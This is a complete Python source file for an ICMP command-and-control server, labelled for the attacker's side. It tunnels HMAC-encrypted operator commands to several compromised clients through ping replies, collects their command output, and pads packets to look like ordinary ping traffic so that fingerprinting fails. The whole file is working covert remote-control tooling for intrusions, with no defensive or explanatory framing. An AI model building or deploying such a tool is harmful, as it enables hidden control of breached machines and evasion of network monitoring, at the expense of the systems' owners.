#!/usr/bin/env python3
"""
ICMP C2 Server (Attacker)
Usage: sudo python3 server.py --key mysecretpass
       sudo python3 server.py --key mysecretpass --padding 64 --verbose
"""

import socket
import struct
import sys
import select
import argparse
import hashlib
import os
import threading
import hmac
from datetime import datetime

# ===== Crypto — HMAC-SHA256 CTR + Authenticate-then-Encrypt =====

class SecureCipher:
    def __init__(self, password: str):
        master = hashlib.sha256(password.encode()).digest()
        self.enc_key  = hmac.new(master, b"enc",  hashlib.sha256).digest()
        self.auth_key = hmac.new(master, b"auth", hashlib.sha256).digest()

    def _keystream(self, iv: bytes, length: int) -> bytes:
        out = bytearray()
        counter = 0
        while len(out) < length:
            block = hmac.new(
                self.enc_key,
                iv + struct.pack("<Q", counter),
                hashlib.sha256
            ).digest()
            out.extend(block)
            counter += 1
        return bytes(out[:length])

    def _mac(self, iv: bytes, ciphertext: bytes) -> bytes:
        return hmac.new(self.auth_key, iv + ciphertext, hashlib.sha256).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        iv  = os.urandom(16)
        ks  = self._keystream(iv, len(plaintext))
        ct  = bytes(a ^ b for a, b in zip(plaintext, ks))
        tag = self._mac(iv, ct)
        return iv + ct + tag  # 16 + len(pt) + 32

    def decrypt(self, data: bytes):
        if len(data) < 48:
            return None
        iv  = data[:16]
        tag = data[-32:]
        ct  = data[16:-32]
        if not hmac.compare_digest(self._mac(iv, ct), tag):
            return None
        ks = self._keystream(iv, len(ct))
        return bytes(a ^ b for a, b in zip(ct, ks))


# ===== ICMP =====

MAGIC          = b'\xDE\xAD'
MSG_POLL       = 0x01
MSG_OUTPUT     = 0x02
MSG_CMD        = 0x03
MSG_NOP        = 0x04
MSG_ACK        = 0x05

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def parse_icmp(packet: bytes):
    ip_header_len = (packet[0] & 0x0F) * 4
    src_ip        = socket.inet_ntoa(packet[12:16])
    icmp_data     = packet[ip_header_len:]
    if len(icmp_data) < 8:
        return None
    icmp_type, _, _, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_data[:8])
    payload = icmp_data[8:]
    return src_ip, icmp_type, icmp_id, icmp_seq, payload


def build_icmp_reply(icmp_id: int, icmp_seq: int, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, icmp_id, icmp_seq)
    cksum  = checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, cksum, icmp_id, icmp_seq)
    return header + payload


def make_payload(msg_type: int, data: bytes, cipher: SecureCipher,
                 pad_to: int = 0) -> bytes:
    """
    Build a C2 payload:  MAGIC (2) + msg_type (1) + encrypted(data)
    If pad_to > 0 the final ICMP payload is padded to exactly pad_to bytes
    so every packet looks the same size — defeats length-based fingerprinting.
    """
    encrypted = cipher.encrypt(data)
    raw = MAGIC + struct.pack("B", msg_type) + encrypted
    if pad_to > 0 and len(raw) < pad_to:
        raw += os.urandom(pad_to - len(raw))
    return raw


def parse_payload(payload: bytes, cipher: SecureCipher):
    if len(payload) < 3 or payload[:2] != MAGIC:
        return None
    msg_type  = payload[2]
    encrypted = payload[3:]
    # Cipher will ignore trailing padding because tag is at a fixed offset
    # We need to find the real ciphertext end — tag is last 32 bytes of
    # the actual encrypted blob.  Since we may have random padding appended
    # AFTER the encrypted blob, we must try decryption on shrinking slices.
    # However the encrypted format is: IV(16) + CT(variable) + TAG(32)
    # and we know: original_len = 16 + len(plaintext) + 32
    # Strategy: try from full length downward until MAC passes.
    for trim in range(0, len(encrypted), 1):
        end = len(encrypted) - trim
        if end < 48:
            return None
        result = cipher.decrypt(encrypted[:end])
        if result is not None:
            return msg_type, result
    return None


# ===== Multi-client session tracker =====

class ClientSession:
    def __init__(self, ip: str):
        self.ip              = ip
        self.connected_at    = datetime.now()
        self.pending_command = None
        self.chunks          = {}
        self.chunk_totals    = {}

    def store_chunk(self, icmp_id: int, seq: int,
                    chunk_idx: int, total: int, data: bytes):
        key = (icmp_id, seq - chunk_idx)
        if key not in self.chunks:
            self.chunks[key]       = {}
            self.chunk_totals[key] = total
        self.chunks[key][chunk_idx] = data
        if len(self.chunks[key]) == self.chunk_totals[key]:
            full = b"".join(self.chunks[key][i]
                            for i in range(self.chunk_totals[key]))
            del self.chunks[key]
            del self.chunk_totals[key]
            return full
        return None


# ===== Operator stdin thread =====

class StdinReader(threading.Thread):
    def __init__(self, sessions, sessions_lock, active_target, verbose):
        super().__init__(daemon=True)
        self.sessions      = sessions
        self.sessions_lock = sessions_lock
        self.active_target = active_target
        self.verbose       = verbose

    def run(self):
        while True:
            try:
                line = input()
            except EOFError:
                break
            line = line.strip()
            if not line:
                continue

            if line.startswith("!target "):
                ip = line.split(None, 1)[1]
                with self.sessions_lock:
                    if ip in self.sessions:
                        self.active_target[0] = ip
                        print(f"[*] Active target → {ip}")
                    else:
                        print(f"[!] Unknown client: {ip}")
                continue

            if line == "!list":
                with self.sessions_lock:
                    if not self.sessions:
                        print("[*] No clients connected")
                    for ip, s in self.sessions.items():
                        marker = " ← active" if ip == self.active_target[0] else ""
                        print(f"    {ip}  (since {s.connected_at.strftime('%H:%M:%S')}){marker}")
                continue

            if line == "!help":
                print("  !list            — show connected clients")
                print("  !target <ip>     — switch active client")
                print("  !help            — this help")
                print("  exit             — disconnect current client")
                print("  <anything else>  — execute on target")
                continue

            with self.sessions_lock:
                target_ip = self.active_target[0]
                if target_ip is None or target_ip not in self.sessions:
                    print("[!] No active target. Use !list / !target <ip>")
                    continue
                self.sessions[target_ip].pending_command = line
                if self.verbose:
                    print(f"[>] Queued for {target_ip}: {line}")


# ===== Kernel helpers =====

def disable_kernel_icmp_reply():
    try:
        with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w") as f:
            f.write("1")
        print("[*] Kernel ICMP echo reply disabled")
    except PermissionError:
        print("[!] Cannot write /proc/sys/…  — run as root")
        sys.exit(1)


def restore_kernel_icmp_reply():
    try:
        with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w") as f:
            f.write("0")
        print("\n[*] Kernel ICMP echo reply restored")
    except Exception:
        pass


# ===== Main =====

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Server")
    parser.add_argument("--key",     "-k", required=True, help="Shared encryption key")
    parser.add_argument("--padding", "-p", type=int, default=0,
                        help="Pad every ICMP payload to this size (bytes). "
                             "Use 64 or 128 to mimic normal ping traffic.")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    cipher = SecureCipher(args.key)
    pad    = args.padding

    disable_kernel_icmp_reply()

    stealth = f"  Padding: {pad} bytes" if pad else "  Padding: off"
    print(f"""
╔══════════════════════════════════════════╗
║         ICMP C2 Server                   ║
║  Multi-client | Retransmit | Reassembly  ║
╚══════════════════════════════════════════╝
{stealth}

[*] Meta-commands:  !list  |  !target <ip>  |  !help
[*] Waiting for callbacks…
""")

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    sessions       = {}
    sessions_lock  = threading.Lock()
    active_target  = [None]

    stdin_thread = StdinReader(sessions, sessions_lock, active_target, args.verbose)
    stdin_thread.start()

    try:
        while True:
            ready, _, _ = select.select([sock], [], [], 0.1)
            if not ready:
                continue

            try:
                raw, _ = sock.recvfrom(65535)
            except Exception:
                continue

            parsed = parse_icmp(raw)
            if not parsed:
                continue

            src_ip, icmp_type, icmp_id, icmp_seq, payload = parsed
            if icmp_type != ICMP_ECHO_REQUEST:
                continue

            result = parse_payload(payload, cipher)
            if not result:
                continue

            msg_type, data = result

            with sessions_lock:
                if src_ip not in sessions:
                    sessions[src_ip] = ClientSession(src_ip)
                    ts = datetime.now().strftime("%H:%M:%S")
                    print(f"\n[{ts}] ✓ New client: {src_ip}")
                    if active_target[0] is None:
                        active_target[0] = src_ip
                        print(f"[*] Auto-selected target → {src_ip}")
                    print(f"[*] Connected clients: {len(sessions)}\n▌",
                          end="", flush=True)
                session = sessions[src_ip]

            if msg_type == MSG_POLL:
                with sessions_lock:
                    cmd = session.pending_command
                    if cmd:
                        session.pending_command = None

                if cmd:
                    if cmd.lower() == "exit":
                        reply_payload = make_payload(MSG_CMD, b"exit", cipher, pad)
                        reply = build_icmp_reply(icmp_id, icmp_seq, reply_payload)
                        sock.sendto(reply, (src_ip, 0))
                        print(f"[*] Exit sent to {src_ip}")
                        with sessions_lock:
                            del sessions[src_ip]
                            if active_target[0] == src_ip:
                                active_target[0] = next(iter(sessions), None)
                        continue
                    reply_payload = make_payload(MSG_CMD, cmd.encode(), cipher, pad)
                else:
                    reply_payload = make_payload(MSG_NOP, b"", cipher, pad)

                reply = build_icmp_reply(icmp_id, icmp_seq, reply_payload)
                sock.sendto(reply, (src_ip, 0))

            elif msg_type == MSG_OUTPUT:
                if len(data) < 4:
                    continue
                chunk_idx, total = struct.unpack("!HH", data[:4])
                chunk_data = data[4:]

                reassembled = session.store_chunk(
                    icmp_id, icmp_seq, chunk_idx, total, chunk_data)
                if reassembled is not None:
                    output = reassembled.decode(errors="replace")
                    ts = datetime.now().strftime("%H:%M:%S")
                    print(f"\n[{ts}] {src_ip} ↴\n{output}", end="▌", flush=True)

                ack = build_icmp_reply(
                    icmp_id, icmp_seq, make_payload(MSG_ACK, b"", cipher, pad))
                sock.sendto(ack, (src_ip, 0))

    except KeyboardInterrupt:
        pass
    finally:
        restore_kernel_icmp_reply()
        sock.close()


if __name__ == "__main__":
    main()
